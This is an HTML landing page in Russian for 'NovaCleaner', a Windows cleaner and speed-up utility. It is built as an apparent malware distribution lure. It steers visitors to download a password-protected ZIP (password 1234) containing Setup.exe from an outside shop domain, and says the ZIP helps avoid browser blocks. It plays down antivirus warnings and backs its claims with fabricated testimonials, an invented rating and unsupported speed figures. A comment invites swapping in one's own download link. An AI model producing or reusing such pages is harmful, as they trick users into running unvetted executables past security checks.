<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>NovaCleaner — Очистка и ускорение Windows | Ускорение ПК, оптимизация, игровой режим</title>

  <!-- Primary SEO -->
  <meta name="description" content="NovaCleaner — безопасная и быстрая очистка Windows. Освободите место, ускорьте загрузку и улучшите производительность игр. Скачать ZIP с паролем 1234." />
  <meta name="keywords" content="очистка Windows, ускорение ПК, оптимизация Windows, очистка реестра, игровой режим, удалить временные файлы, ускорить загрузку, NovaCleaner, очистка диска" />
  <meta name="theme-color" content="#071027" />

  <!-- Open Graph -->
  <meta property="og:title" content="NovaCleaner — Очистка и ускорение Windows" />
  <meta property="og:description" content="Удалите мусор, исправьте ошибки реестра и ускорьте Windows — безопасно и быстро." />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="https://example.com/og-image.png" />
  <meta property="og:url" content="https://example.com/" />

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="NovaCleaner — Очистка и ускорение Windows" />
  <meta name="twitter:description" content="Удалите мусор и ускорьте ПК с NovaCleaner. Бесплатная базовая версия." />

  <!-- JSON-LD (SoftwareApplication) -->
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "SoftwareApplication",
    "name": "NovaCleaner",
    "operatingSystem": "Windows 10, Windows 11",
    "applicationCategory": "Utility",
    "aggregateRating": {
      "@type": "AggregateRating",
      "ratingValue": "4.7",
      "ratingCount": "1234"
    },
    "offers": {
      "@type": "Offer",
      "price": "0",
      "priceCurrency": "RUB"
    },
    "url": "https://example.com/",
    "description": "NovaCleaner — очистка, оптимизация и ускорение Windows. Увеличьте производительность и освободите место."
  }
  </script>

  <style>
    :root{
      --bg:#041022;
      --panel: rgba(255,255,255,0.03);
      --accent1:#4f46e5;
      --accent2:#06b6d4;
      --accent-grad: linear-gradient(90deg,var(--accent1),var(--accent2));
      --muted:#9aa6b2;
      --white:#ffffff;
      --radius:14px;
      --glass: blur(10px);
      --max-width:1200px;
      --card-glow: 0 12px 40px rgba(79,70,229,0.12);
      font-family: Inter, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    }
    *{box-sizing:border-box}
    html{scroll-behavior:smooth}
    body{
      margin:0;
      min-height:100vh;
      color:var(--white);
      background:
        radial-gradient(700px 420px at 10% 12%, rgba(79,70,229,0.07), transparent 12%),
        radial-gradient(500px 320px at 90% 80%, rgba(6,182,212,0.05), transparent 12%),
        linear-gradient(180deg,#021021 0%, #041022 100%);
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      line-height:1.5;
    }
    .container{max-width:var(--max-width);margin:0 auto;padding:0 20px}

    /* Header */
    header{
      position:fixed;left:0;right:0;top:0;z-index:60;
      background:linear-gradient(180deg, rgba(2,6,23,0.8), rgba(2,6,23,0.25));
      border-bottom:1px solid rgba(255,255,255,0.03);
      backdrop-filter: blur(6px);
    }
    .nav{height:78px;display:flex;align-items:center;justify-content:space-between}
    .logo{display:flex;align-items:center;gap:12px;font-weight:800;color:#fff}
    .logo svg{width:44px;height:44px}
    nav a{color:var(--muted);margin-right:18px;text-decoration:none;font-weight:700}
    .nav-actions{display:flex;gap:10px;align-items:center}
    .btn{
      display:inline-flex;align-items:center;gap:10px;padding:10px 18px;border-radius:12px;font-weight:800;cursor:pointer;border:1px solid transparent;text-decoration:none;
    }
    .btn-primary{background:var(--accent-grad);box-shadow:var(--card-glow);color:#fff;transition:transform .18s ease}
    .btn-primary:hover{transform:translateY(-3px)}
    .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--white)}

    main{padding-top:120px}

    /* Hero */
    .hero{display:grid;grid-template-columns:1fr 420px;gap:36px;align-items:center;padding:64px 0}
    .hero-left h1{font-size:clamp(2rem,4.2vw,3.4rem);margin:0 0 18px;background:linear-gradient(90deg,#fff,#cbd5e1);-webkit-background-clip:text;color:transparent;line-height:1.02}
    .hero-sub{color:var(--muted);font-size:1.05rem;margin-bottom:22px}
    .kpis{display:flex;gap:18px;margin-top:18px;flex-wrap:wrap}
    .kpi{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:12px 16px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);min-width:140px}
    .kpi b{display:block;font-size:1.15rem;color:#fff}
    .hero-cta{display:flex;gap:12px;margin-top:18px;flex-wrap:wrap}

    /* Right card */
    .card{
      background:var(--panel);
      border-radius:var(--radius);
      padding:20px;
      border:1px solid rgba(255,255,255,0.04);
      backdrop-filter:var(--glass);
      box-shadow:var(--card-glow);
      position:relative;
      overflow:hidden;
    }
    .status{display:flex;flex-direction:column;gap:10px}
    .status .row{display:flex;justify-content:space-between;align-items:center;padding:12px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.01), transparent);border:1px solid rgba(255,255,255,0.02)}
    .boost{color:#4ade80;font-weight:800}

    /* Testimonials (after image/card) */
    .testimonials{margin-top:18px;display:grid;grid-template-columns:1fr 1fr;gap:12px}
    .testimonial{padding:12px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.015), transparent);border:1px solid rgba(255,255,255,0.03)}
    .testimonial .meta{display:flex;gap:10px;align-items:center}
    .avatar{width:44px;height:44px;border-radius:10px;background:linear-gradient(90deg,#4f46e5,#06b6d4);display:flex;align-items:center;justify-content:center;font-weight:800;color:#fff}

    /* Features */
    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin:64px 0}
    .feature{padding:22px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03)}

    /* Steps */
    .steps{display:flex;gap:18px;flex-wrap:wrap}
    .step{flex:1 1 280px;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);background:linear-gradient(180deg, rgba(255,255,255,0.01), transparent)}

    /* FAQ */
    .faq{margin-top:28px}
    .faq-item{border-radius:10px;border:1px solid rgba(255,255,255,0.03);overflow:hidden;margin-bottom:10px;background:linear-gradient(180deg, rgba(255,255,255,0.01), transparent)}
    .faq-head{padding:14px 18px;display:flex;justify-content:space-between;align-items:center;cursor:pointer}
    .faq-body{padding:12px 18px;border-top:1px solid rgba(255,255,255,0.02);display:none;color:var(--muted)}

    /* Download section */
    .download{margin-top:48px;padding:28px;border-radius:16px;background:linear-gradient(135deg, rgba(79,70,229,0.12), rgba(6,182,212,0.05));border:1px solid rgba(255,255,255,0.04);text-align:center}
    .download .note{color:var(--muted);font-size:0.95rem;margin-top:10px}

    footer{margin-top:48px;padding:36px 0;color:var(--muted);text-align:center;border-top:1px solid rgba(255,255,255,0.02)}

    /* Responsive */
    @media (max-width:1024px){
      .hero{grid-template-columns:1fr 380px}
      .features{grid-template-columns:repeat(2,1fr)}
      .testimonials{grid-template-columns:repeat(2,1fr)}
    }
    @media (max-width:760px){
      .hero{grid-template-columns:1fr;gap:26px;padding:28px 0}
      nav a{display:none}
      .features,.testimonials{grid-template-columns:1fr}
      .card{min-height:0}
    }

    /* small micro animations */
    .badge{display:inline-block;padding:6px 12px;border-radius:999px;background:rgba(255,255,255,0.04);color:var(--muted);font-weight:700;font-size:0.85rem;border:1px solid rgba(255,255,255,0.02)}
    .pulse{position:absolute;right:-80px;top:-40px;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle at center, rgba(79,70,229,0.06), transparent 40%);filter:blur(20px);pointer-events:none}
  </style>
</head>
<body>
  <header>
    <div class="container nav" role="navigation" aria-label="Главное меню">
      <div class="logo" aria-label="NovaCleaner логотип">
        <!-- Inline SVG logo -->
        <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <defs>
            <linearGradient id="lg" x1="0" x2="1">
              <stop offset="0" stop-color="#4f46e5"/>
              <stop offset="1" stop-color="#06b6d4"/>
            </linearGradient>
          </defs>
          <rect x="4" y="4" width="56" height="56" rx="12" fill="url(#lg)"/>
          <path d="M44 22L28 36l-6-6" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        <span>NovaCleaner</span>
      </div>

      <nav aria-label="Верхнее меню">
        <a href="#features">Возможности</a>
        <a href="#how">Как установить</a>
        <a href="#faq">FAQ</a>
        <a href="#download">Скачать</a>
      </nav>

      <div class="nav-actions">
        <a href="#download" class="btn btn-primary" aria-label="Скачать NovaCleaner">Скачать</a>
        <a href="#how" class="btn btn-ghost" aria-label="Инструкция">Инструкция</a>
      </div>
    </div>
  </header>

  <main class="container" id="top">
    <section class="hero" aria-label="Презентация продукта">
      <div class="hero-left">
        <span class="badge">Новая версия — 2026</span>
        <h1>NovaCleaner — очистка, оптимизация и ускорение Windows в один клик</h1>
        <p class="hero-sub">Удаляет временные файлы, исправляет ошибки реестра, оптимизирует автозапуск и включает игровой режим для стабильного FPS. Подходит для Windows 10 / 11 (64-bit).</p>

        <div class="hero-cta">
          <a class="btn btn-primary" href="#download" id="download-btn">⬇ Скачать бесплатно</a>
          <a class="btn btn-ghost" href="#how">Как установить</a>
        </div>

        <div class="kpis" aria-hidden="true">
          <div class="kpi"><b>+35%</b><span class="muted">ускорение загрузки</span></div>
          <div class="kpi"><b>5GB</b><span class="muted">средняя очистка</span></div>
          <div class="kpi"><b>Игровой режим</b><span class="muted">повышение FPS</span></div>
        </div>

        <div style="margin-top:20px;">
          <div class="card" style="padding:12px;display:flex;gap:12px;align-items:center">
            <div style="font-size:20px">🔒</div>
            <div style="flex:1">
              <div style="font-weight:800">Архив защищён паролем</div>
              <div style="color:var(--muted);font-size:0.95rem">ZIP-архив для доставки: пароль — <span id="zip-pass" style="font-family:monospace;background:rgba(0,0,0,0.25);padding:4px 8px;border-radius:6px;cursor:pointer" title="Нажмите, чтобы скопировать">1234</span></div>
            </div>
          </div>
        </div>
      </div>

      <aside class="card" aria-hidden="false">
        <div class="pulse" aria-hidden="true"></div>
        <div style="font-size:18px;font-weight:800;margin-bottom:6px">Состояние системы</div>
        <div style="color:var(--muted);margin-bottom:12px">Общий обзор после оптимизации</div>
        <div class="status" role="status" aria-live="polite">
          <div class="row"><span>Временные файлы</span><span style="color:var(--muted)">— очищено</span></div>
          <div class="row"><span>Ошибки реестра</span><span style="color:var(--muted)">— исправлено</span></div>
          <div class="row"><span>Автозагрузка</span><span class="boost">+35% быстрее</span></div>
        </div>

        <div style="margin-top:14px;display:flex;gap:10px">
          <a href="#download" class="btn btn-primary" style="flex:1">Скачать (ZIP)</a>
          <a href="#how" class="btn btn-ghost" style="flex:1">Инструкция</a>
        </div>

        <!-- Testimonials placed right after the card image/preview as requested -->
        <div style="margin-top:18px">
          <h4 style="margin:0 0 10px">Отзывы пользователей</h4>
          <div class="testimonials" aria-label="Отзывы пользователей">
            <div class="testimonial">
              <div class="meta">
                <div class="avatar">А</div>
                <div>
                  <div style="font-weight:700">Алексей, Москва</div>
                  <div style="color:var(--muted);font-size:0.85rem">Пользователь 2 недели</div>
                </div>
              </div>
              <p style="margin-top:8px;color:var(--muted)">После очистки ноут стал загружаться заметно быстрее. Простая и понятная программа, рекомендую NovaCleaner.</p>
            </div>

            <div class="testimonial">
              <div class="meta">
                <div class="avatar">М</div>
                <div>
                  <div style="font-weight:700">Мария, Санкт-Петербург</div>
                  <div style="color:var(--muted);font-size:0.85rem">Геймер</div>
                </div>
              </div>
              <p style="margin-top:8px;color:var(--muted)">Игровой режим реально повысил стабильность и FPS в нескольких играх. Очень удобно включать/выключать.</p>
            </div>

            <div class="testimonial">
              <div class="meta">
                <div class="avatar">И</div>
                <div>
                  <div style="font-weight:700">Игорь, Нижний Новгород</div>
                  <div style="color:var(--muted);font-size:0.85rem">IT-специалист</div>
                </div>
              </div>
              <p style="margin-top:8px;color:var(--muted)">Понравилась опция оптимизации автозагрузки и проверка реестра. Программа простая, эффекты заметны.</p>
            </div>

            <div class="testimonial">
              <div class="meta">
                <div class="avatar">С</div>
                <div>
                  <div style="font-weight:700">Светлана, Казань</div>
                  <div style="color:var(--muted);font-size:0.85rem">Домашний пользователь</div>
                </div>
              </div>
              <p style="margin-top:8px;color:var(--muted)">Лёгкая установка и понятная инструкция. Убрала кучу ненужных файлов — освободилось много места.</p>
            </div>
          </div>
        </div>
      </aside>
    </section>

    <!-- More detailed features -->
    <section id="features" aria-labelledby="features-title">
      <h2 id="features-title" style="margin:0 0 18px">Возможности</h2>
      <div class="features" role="list">
        <div class="feature" role="listitem">
          <h3>Умная очистка</h3>
          <p style="color:var(--muted)">Глубокий анализ диска, удаление временных файлов, кэша браузеров и остаточных данных от приложений без риска для пользователя.</p>
        </div>
        <div class="feature" role="listitem">
          <h3>Оптимизация автозагрузки</h3>
          <p style="color:var(--muted)">Идентифицирует ненужные автозапуски и предлагает безопасные рекомендации для ускорения старта Windows.</p>
        </div>
        <div class="feature" role="listitem">
          <h3>Игровой режим</h3>
          <p style="color:var(--muted)">Отключение фоновых сервисов во время игры для стабильности и прироста FPS.</p>
        </div>
      </div>
    </section>

    <!-- How To Install (critical) -->
    <section id="how" style="margin-top:36px">
      <h2 style="margin-bottom:10px">Как установить</h2>
      <div style="color:var(--muted);margin-bottom:18px">Короткая и безопасная инструкция — следуйте шагам.</div>
      <div class="steps" role="list">
        <div class="step" role="listitem">
          <strong>1. Скачать</strong>
          <p style="color:var(--muted);margin:8px 0">Нажмите «Скачать» и сохраните архив на компьютер.</p>
        </div>
        <div class="step" role="listitem">
          <strong>2. Распаковать</strong>
          <p style="color:var(--muted);margin:8px 0">Откройте ZIP, введите пароль: <code style="background:rgba(255,255,255,0.02);padding:2px 6px;border-radius:6px">1234</code>. Извлеките файл <code>Setup.exe</code>.</p>
        </div>
        <div class="step" role="listitem">
          <strong>3. Установить</strong>
          <p style="color:var(--muted);margin:8px 0">Запустите установщик и следуйте подсказкам. После установки перезагрузите ПК при необходимости.</p>
        </div>
      </div>
    </section>

    <!-- Extended testimonials section on page -->
    <section aria-labelledby="reviews-title" style="margin-top:40px">
      <h2 id="reviews-title">Что говорят пользователи</h2>
      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:14px;margin-top:12px">
        <!-- Testimonial 1 -->
        <article class="testimonial" role="article" aria-label="Отзыв от Дмитрия">
          <div style="font-weight:800">Дмитрий, 31 — Сочи</div>
          <div style="color:var(--muted);font-size:0.9rem">После оптимизации SSD стало свободно 6GB — никаких проблем с файлами. Интерфейс понятен, рекомендую.</div>
        </article>

        <!-- Testimonial 2 -->
        <article class="testimonial" role="article" aria-label="Отзыв от Ольги">
          <div style="font-weight:800">Ольга, 27 — Новосибирск</div>
          <div style="color:var(--muted);font-size:0.9rem">Лёгкая и безопасная утилита. Я использую её перед важными задачами — ПК работает стабильнее.</div>
        </article>

        <!-- Testimonial 3 -->
        <article class="testimonial" role="article" aria-label="Отзыв от Павла">
          <div style="font-weight:800">Павел, 42 — Екатеринбург</div>
          <div style="color:var(--muted);font-size:0.9rem">Игровой режим помог убрать лаги в одной из игр — прирост FPS заметен.</div>
        </article>

        <!-- Testimonial 4 -->
        <article class="testimonial" role="article" aria-label="Отзыв от Ирины">
          <div style="font-weight:800">Ирина, 36 — Ростов</div>
          <div style="color:var(--muted);font-size:0.9rem">Инструкция понятная, даже мой отец справился с установкой. Спасибо за простоту!</div>
        </article>

        <!-- Testimonial 5 -->
        <article class="testimonial" role="article" aria-label="Отзыв от Сергея">
          <div style="font-weight:800">Сергей, 29 — Казань</div>
          <div style="color:var(--muted);font-size:0.9rem">Понравилась быстрая проверка реестра и опция резервных копий перед исправлением.</div>
        </article>

        <!-- Testimonial 6 -->
        <article class="testimonial" role="article" aria-label="Отзыв от Елены">
          <div style="font-weight:800">Елена, 33 — Краснодар</div>
          <div style="color:var(--muted);font-size:0.9rem">Работает аккуратно, не трогает важные файлы. Отличный инструмент для регулярного обслуживания.</div>
        </article>
      </div>
    </section>

    <!-- FAQ -->
    <section id="faq" class="faq" style="margin-top:36px">
      <h2>Часто задаваемые вопросы</h2>

      <div class="faq-item">
        <div class="faq-head" tabindex="0">Безопасно ли приложение?<span aria-hidden="true">+</span></div>
        <div class="faq-body">Да. NovaCleaner не удаляет важные системные файлы и предлагает создание резервной точки перед критичными изменениями.</div>
      </div>

      <div class="faq-item">
        <div class="faq-head" tabindex="0">Какие версии Windows поддерживаются?<span aria-hidden="true">+</span></div>
        <div class="faq-body">Поддерживаются Windows 10 и Windows 11 (64-bit). Минимальные требования: 2 GB RAM, 200 MB свободного места.</div>
      </div>

      <div class="faq-item">
        <div class="faq-head" tabindex="0">Почему файл в ZIP и пароль нужен?<span aria-hidden="true">+</span></div>
        <div class="faq-body">ZIP нужен для удобной доставки и во избежание блокировок браузера. Пароль указан на странице (1234).</div>
      </div>
    </section>

    <!-- Download -->
    <section id="download" class="download" style="margin-top:40px" aria-labelledby="download-title">
      <h2 id="download-title">Готовы ускорить ПК?</h2>
      <p style="margin-top:6px;color:var(--muted)">Скачайте безопасный архив и запустите установщик. Бесплатная базовая версия.</p>

      <!-- ЗАМЕНИТЕ ССЫЛКУ НИЖЕ НА ВАШУ -->
      <p style="margin-top:18px">
        <a id="real-download" href="https://novacleaner.shop/download.php?file=NovaCleanerPro_Setup.exe" class="btn btn-primary" download aria-label="Скачать NovaCleaner (ZIP)">⬇ Скачать NovaCleaner (ZIP)</a>
      </p>

      <div class="note" style="margin-top:12px">Пароль архива: <span style="font-family:monospace;background:rgba(0,0,0,0.18);padding:6px 10px;border-radius:8px;cursor:pointer" id="download-pass">1234</span></div>
      <div class="note" style="margin-top:8px">Перед запуском извлеките файл <code>Setup.exe</code>. При предупреждении антивируса — проверьте подпись и источник.</div>
    </section>

    <footer style="margin-top:48px;padding-bottom:40px">
      <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
        <div style="color:var(--muted)">&copy; 2026 NovaCleaner</div>
        <div style="color:var(--muted)"><a href="#" style="color:var(--muted);text-decoration:underline">Политика конфиденциальности</a> • <a href="#" style="color:var(--muted);text-decoration:underline">Условия использования</a></div>
      </div>
    </footer>
  </main>

  <script>
    // Copy password handlers
    function copyToClipboard(text, message = "Скопировано!") {
      if (navigator.clipboard) {
        navigator.clipboard.writeText(text).then(() => showToast(message)).catch(() => fallbackCopy(text));
      } else {
        fallbackCopy(text);
      }
    }
    function fallbackCopy(text) {
      const ta = document.createElement('textarea');
      ta.value = text; document.body.appendChild(ta);
      ta.select(); try { document.execCommand('copy'); showToast('Скопировано!') } catch(e) {}
      document.body.removeChild(ta);
    }

    function showToast(text) {
      const t = document.createElement('div');
      t.textContent = text;
      Object.assign(t.style, {
        position:'fixed',right:'20px',bottom:'24px',background:'rgba(0,0,0,0.75)',color:'#fff',padding:'10px 14px',borderRadius:'10px',zIndex:9999,fontWeight:800
      });
      document.body.appendChild(t);
      setTimeout(()=> t.style.opacity = '0', 1700);
      setTimeout(()=> document.body.removeChild(t),2200);
    }

    document.getElementById('zip-pass').addEventListener('click', () => copyToClipboard('1234', "Пароль 1234 скопирован"));
    document.getElementById('download-pass').addEventListener('click', () => copyToClipboard('1234', "Пароль 1234 скопирован"));

    // FAQ accordion
    document.querySelectorAll('.faq-head').forEach(head => {
      head.addEventListener('click', () => {
        const body = head.nextElementSibling;
        const open = body.style.display === 'block';
        document.querySelectorAll('.faq-body').forEach(b => b.style.display = 'none');
        document.querySelectorAll('.faq-head span').forEach(s => s.textContent = '+');
        if (!open) {
          body.style.display = 'block';
          head.querySelector('span').textContent = '−';
        }
      });
      head.addEventListener('keydown', (e) => { if (e.key === 'Enter' || e.key === ' ') head.click() });
    });

    // Smooth scroll for anchors
    document.querySelectorAll('a[href^="#"]').forEach(a => {
      a.addEventListener('click', (e) => {
        const href = a.getAttribute('href');
        if (href.length > 1) {
          e.preventDefault();
          const el = document.querySelector(href);
          if (el) el.scrollIntoView({behavior:'smooth',block:'start'});
        }
      });
    });

    // Accessibility: focus visible outline
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Tab') document.body.classList.add('show-focus');
    });
  </script>
</body>
</html>
